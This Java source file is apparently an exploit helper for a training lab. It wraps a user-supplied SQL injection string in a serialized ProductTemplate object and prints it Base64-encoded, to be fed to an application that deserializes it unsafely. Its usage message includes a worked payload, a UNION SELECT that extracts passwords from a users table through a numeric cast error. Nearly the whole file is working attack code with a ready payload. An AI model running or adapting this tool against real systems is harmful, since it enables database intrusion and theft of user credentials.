import data.productcatalog.ProductTemplate;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.util.Base64;

class Main {
    public static void main(String[] args) throws Exception {
        if (args.length == 0) {
            System.err.println("Error: No payload provided.");
            System.err.println("Usage: java Main <sql-injection-payload>");
            System.err.println("\nExample (vulnerability check):");
            System.err.println("  java Main \"'\"");
            System.err.println("\nExample (exploit to extract password):");
            System.err.println("  java Main \"' UNION SELECT NULL, NULL, NULL, CAST(password AS numeric), NULL, NULL, NULL, NULL FROM users--\"");
            System.exit(1);
        }
        String payload = args[0];

        System.out.println("Generating serialized object for payload: \"" + payload + "\"");
        ProductTemplate originalObject = new ProductTemplate(payload);

        String serializedObject = serialize(originalObject);

        System.out.println("\nSerialized and Base64-encoded payload:");
        System.out.println(serializedObject);
    }

    private static String serialize(Serializable obj) throws Exception {
        ByteArrayOutputStream baos = new ByteArrayOutputStream(512);
        try (ObjectOutputStream out = new ObjectOutputStream(baos)) {
            out.writeObject(obj);
        }
        return Base64.getEncoder().encodeToString(baos.toByteArray());
    }
}